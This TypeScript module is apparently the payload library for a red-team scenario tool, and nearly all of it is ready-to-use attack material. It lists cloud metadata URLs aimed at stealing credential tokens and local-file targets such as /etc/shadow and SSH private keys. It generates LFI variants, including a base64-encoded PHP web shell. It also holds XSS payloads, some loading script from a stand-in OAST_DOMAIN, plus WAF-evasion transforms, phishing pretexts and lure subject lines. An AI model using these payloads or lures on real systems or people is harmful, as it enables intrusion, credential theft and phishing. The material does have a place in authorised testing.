/* ─────────────────────────────────────────────────────────────────────────────
   Payload knowledge bases for the scenario tools. All templates are inert
   strings used to author disposable CSVs / rule files / reports offline; nothing
   here executes, sends, or resolves anything.
   ──────────────────────────────────────────────────────────────────────────── */

/** SSRF-prone URL parameter names commonly seen in internal ticketing, PDF
 *  renderers, webhook configs and image proxies. */
export const SSRF_PARAMS = [
  'url',
  'uri',
  'target',
  'dest',
  'destination',
  'redirect',
  'redirect_uri',
  'next',
  'continue',
  'return',
  'returnUrl',
  'callback',
  'callbackUrl',
  'webhook',
  'feed',
  'host',
  'site',
  'html',
  'reference',
  'path',
  'image',
  'img',
  'src',
  'source',
  'u',
  'link',
  'fetch',
  'proxy',
  'request',
  'page',
];

/** Cloud metadata endpoints to target during SSRF triage. */
export const METADATA_TARGETS = [
  { name: 'AWS IMDSv1', url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' },
  { name: 'AWS IMDSv2 token', url: 'http://169.254.169.254/latest/api/token' },
  { name: 'GCP metadata', url: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' },
  { name: 'Azure IMDS', url: 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' },
  { name: 'DigitalOcean', url: 'http://169.254.169.254/metadata/v1.json' },
  { name: 'Alibaba Cloud', url: 'http://100.100.100.200/latest/meta-data/' },
  { name: 'Oracle Cloud', url: 'http://192.0.0.192/opc/v2/instance/' },
  { name: 'Kubernetes SA token', url: 'https://kubernetes.default.svc/api/v1/namespaces/default/secrets' },
];

/** /proc self-enumeration targets reachable via local file read primitives. */
export const LFI_TARGETS = [
  '/etc/passwd',
  '/etc/shadow',
  '/etc/hosts',
  '/etc/hosts.allow',
  '/etc/ssh/sshd_config',
  '/root/.ssh/id_rsa',
  '/root/.ssh/authorized_keys',
  '/home/USER/.bash_history',
  '/var/log/auth.log',
  '/var/log/apache2/access.log',
  '/proc/self/environ',
  '/proc/self/cmdline',
  '/proc/1/cgroup',
  '/var/lib/mysql/mysql/user.MYD',
  'C:\\Windows\\win.ini',
  'C:\\Windows\\System32\\drivers\\etc\\hosts',
  'C:\\inetpub\\wwwroot\\web.config',
  'C:\\Users\\Administrator\\.ssh\\id_rsa',
];

/** Alternate-encoding sweep for a single LF/CRLF-agnostic string. */
export function lfiVariants(path: string): string[] {
  const hex = Array.from(path, (c) => '%' + c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
  const double = hex.replace(/%/g, '%25');
  return [
    path,
    path.replace(/\//g, '..//'),
    `....//....//${path.replace(/^\/+/, '')}`,
    hex,
    double,
    path.replace(/\//g, '\\/'),
    path.replace(/\./g, '%2e'),
    `php://filter/convert.base64-encode/resource=${path}`,
    `php://filter/read=string.rot13/resource=${path}`,
    `expect://id`,
    `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+`,
  ];
}

/** Ports a red team checks first, sorted by operational value. */
export const PRIORITY_PORTS: Array<[number, string, string]> = [
  [21, 'ftp', 'FTP - anonymous upload / bounce'],
  [22, 'ssh', 'SSH - creds spray, key reuse'],
  [23, 'telnet', 'Telnet - clear text creds'],
  [25, 'smtp', 'SMTP - VRFY/user enum, open relay'],
  [53, 'dns', 'DNS - AXFR, cache snoop'],
  [80, 'http', 'HTTP - web app surface'],
  [88, 'kerberos', 'Kerberos - ASREP roast / kerberoast'],
  [110, 'pop3', 'POP3 - clear text auth'],
  [135, 'msrpc', 'MSRPC - endpoint enum'],
  [139, 'netbios-ssn', 'NetBIOS - null session'],
  [389, 'ldap', 'LDAP - anonymous bind'],
  [443, 'https', 'HTTPS - TLS/SNI vhost discovery'],
  [445, 'microsoft-ds', 'SMB - signing checks, shares'],
  [464, 'kpasswd', 'Kpasswd - password change'],
  [593, 'http-rpc-epmap', 'RPC over HTTP'],
  [636, 'ldaps', 'LDAPS'],
  [873, 'rsync', 'Rsync - unauthenticated modules'],
  [1433, 'mssql', 'MSSQL - sa brute / xp_cmdshell'],
  [1521, 'oracle', 'Oracle TNS'],
  [2049, 'nfs', 'NFS - showmount, uid spoof'],
  [2375, 'docker', 'Docker API - unauthenticated'],
  [2376, 'docker-tls', 'Docker API over TLS'],
  [3000, 'grafana/node', 'Dev servers'],
  [3306, 'mysql', 'MySQL'],
  [3389, 'ms-wbt-server', 'RDP - BlueKeep triage, creds'],
  [5432, 'postgresql', 'PostgreSQL'],
  [5672, 'amqp', 'RabbitMQ - guest:guest'],
  [5900, 'vnc', 'VNC - no-auth'],
  [5985, 'wsman', 'WinRM HTTP - evil-winrm'],
  [5986, 'wsmans', 'WinRM HTTPS'],
  [6379, 'redis', 'Redis - unauthenticated RCE vector'],
  [8080, 'http-proxy', 'Alt HTTP port'],
  [8443, 'https-alt', 'Alt HTTPS port'],
  [9000, 'php-fpm', 'PHP-FPM - fastcgi'],
  [9200, 'elasticsearch', 'Elasticsearch - no auth'],
  [11211, 'memcached', 'Memcached - UDP amplification'],
  [27017, 'mongodb', 'MongoDB - no auth'],
];

/** Subdomain prefixes grouped by the attack they enable. */
export const SUBDOMAIN_PREFIXES: Record<string, string[]> = {
  'Dev / staging': ['dev', 'develop', 'development', 'staging', 'stage', 'stg', 'uat', 'qa', 'test', 'testing', 'preprod', 'sandbox', 'demo', 'preview'],
  'Admin surfaces': ['admin', 'administrator', 'panel', 'cpanel', 'manage', 'management', 'console', 'dashboard', 'portal', 'internal', 'intranet', 'extranet', 'staff', 'employee'],
  'Auth / identity': ['auth', 'login', 'sso', 'idp', 'accounts', 'oauth', 'identity', 'adfs', 'okta', 'kerberos', 'vpn', 'remote', 'rdp', 'citrix'],
  'Mail / collaboration': ['mail', 'smtp', 'imap', 'pop', 'webmail', 'exchange', 'owa', 'autodiscover', 'teams', 'sharepoint', 'onedrive', 'confluence', 'jira', 'wiki', 'gitlab', 'git', 'jenkins'],
  'Cloud / storage': ['s3', 'assets', 'static', 'cdn', 'media', 'files', 'uploads', 'download', 'backup', 'backups', 'storage', 'data', 'bucket'],
  'API / services': ['api', 'api-v1', 'api-v2', 'graphql', 'grpc', 'rest', 'gateway', 'proxy', 'edge', 'webhook', 'hooks', 'events', 'status', 'metrics'],
  'Data / monitoring': ['db', 'database', 'sql', 'mysql', 'postgres', 'redis', 'mongo', 'elastic', 'kibana', 'grafana', 'prometheus', 'monitor', 'monitoring', 'logs', 'splunk'],
  'Orphan bait': ['old', 'new', 'legacy', 'beta', 'alpha', 'v2', 'v3', 'app', 'mobile', 'm', 'cloud', 'aws', 'azure', 'gcp', 'node1', 'node2', 'prod-old'],
};

/** Payload families written into a generated XSS test corpus. */
export const XSS_TEMPLATES = [
  `<script>alert(document.domain)</script>`,
  `<img src=x onerror=alert(document.domain)>`,
  `<svg/onload=alert(document.domain)>`,
  `<body onload=alert(document.domain)>`,
  `"><img src=x onerror=alert(document.domain)>`,
  `'><svg onload=alert(document.domain)>`,
  `javascript:alert(document.domain)`,
  `jaVasCript:/*--></title></style></textarea></script></xmp><svg onload=alert(document.domain)>`,
  `<a href="javascript:alert(document.domain)">click</a>`,
  `<iframe srcdoc="<script>alert(document.domain)</script>"></iframe>`,
  `<details open ontoggle=alert(document.domain)>`,
  `<svg><animate onbegin=alert(document.domain) attributeName=x dur=1s>`,
  `<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(document.domain)&gt;">`,
  `<input autofocus onfocus=alert(document.domain)>`,
  `<select autofocus onfocus=alert(document.domain)>`,
  `<textarea autofocus onfocus=alert(document.domain)>`,
  `<video><source onerror=alert(document.domain)>`,
  `{{constructor.constructor('alert(document.domain)')()}}`,
  `\${alert(document.domain)}`,
  `[[${alert(document.domain)}]]`,
  `<div id=x tabindex=1 onfocusout=alert(document.domain)>`,
  `<script src=//OAST_DOMAIN/x.js></script>`,
  `<img src=//OAST_DOMAIN/p.png>`,
  `-alert(document.domain)-`,
  `</Title/><Script>alert(document.domain)</Script>`,
];

/** WAF evasion transforms applied to a baseline payload. */
export const WAF_TRANSFORMS: Array<[string, (p: string) => string]> = [
  ['Case flip', (p) => p.replace(/script/gi, (m) => (Math.random() > 0.5 ? 'ScRiPt' : 'ScRiPt'.toLowerCase()))],
  ['Double extension', (p) => p.replace(/alert/, 'al\\u0065rt')],
  ['URL encode', (p) => encodeURIComponent(p)],
  ['Double URL encode', (p) => encodeURIComponent(encodeURIComponent(p))],
  ['HTML entities', (p) => p.replace(/alert/g, '&#97;&#108;&#101;&#114;&#116;')],
  ['Null byte', (p) => p.slice(0, 9) + '%00' + p.slice(9)],
  ['Comment break', (p) => p.replace(/script/g, 'scr<!-- -->ipt')],
  ['Tab whitespace', (p) => p.replace(/ /g, '%09')],
  ['Line break', (p) => p.replace(/ /g, '%0a')],
  ['Slash swap', (p) => p.replace(/\//g, '\\/')],
];

/** User-agent strings worth sizing a detection test against. */
export const USER_AGENTS: Array<[string, string]> = [
  ['Chrome 131 / Windows', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'],
  ['Edge 131 / Windows', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0'],
  ['Firefox 133 / Windows', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0'],
  ['Safari 18 / macOS', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15'],
  ['Chrome 131 / Android', 'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36'],
  ['Safari / iOS 18', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1'],
  ['Googlebot', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'],
  ['curl 8.x', 'curl/8.11.0'],
  ['python-requests', 'python-requests/2.32.3'],
  ['sqlmap', 'sqlmap/1.9.1#stable (https://sqlmap.org)'],
  ['Nmap Scripting Engine', 'Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)'],
];

/** Pretext skeletons for authorisation-cover material (SOW / test-plan text). */
export const RULES_OF_ENGAGEMENT_SECTIONS: Array<[string, string]> = [
  [
    'Scope',
    'External perimeter: *.TARGET_DOMAIN, 203.0.113.0/24 as published in AS64500.\r\nInternal: 10.20.0.0/16 (corp), 10.21.0.0/16 (dmz), lab AD forest CORP.LOCAL.\r\nExcluded: production payment gateway, third-party SaaS tenants, employee personal devices.',
  ],
  [
    'Out-of-scope',
    'Any asset not listed above; denial-of-service against production; physical access to data centres; social engineering of executives without prior written approval.',
  ],
  [
    'Testing windows',
    'External: 24/7 for reconnaissance and low-touch validation.\r\nInternal: 22:00-06:00 UTC Mon-Thu, 10:00-18:00 UTC Sat for active exploitation.\r\nSocial engineering: business hours only, max 25 targets per wave.',
  ],
  [
    'Contacts',
    'Primary: SOC@CLIENT.TLD (+44 20 7946 0000)\r\nEscalation: Head of Security, sec-lead@CLIENT.TLD\r\nArtefact retention: encrypted at rest, destroyed 30 days after report sign-off.',
  ],
];

export const PRETEXT_PROFILES = [
  'IT helpdesk password rotation',
  'Payroll update before month end',
  'New starter onboarding form',
  'Mandatory security awareness training',
  'Shared document from a colleague (OneDrive/SharePoint)',
  'Courier delivery failure notification',
  'Conference attendee list confirmation',
  'Vendor invoice overdue',
];

export const PHISHING_HOOKS = [
  'Your session has expired — sign in again to continue',
  'Action required: verify your mailbox storage is full',
  'A new device signed in to your account',
  'Your expense report needs one more approval',
  'Document shared with you: Q4-Planning.xlsx',
  'Password expires today — keep your current password',
];
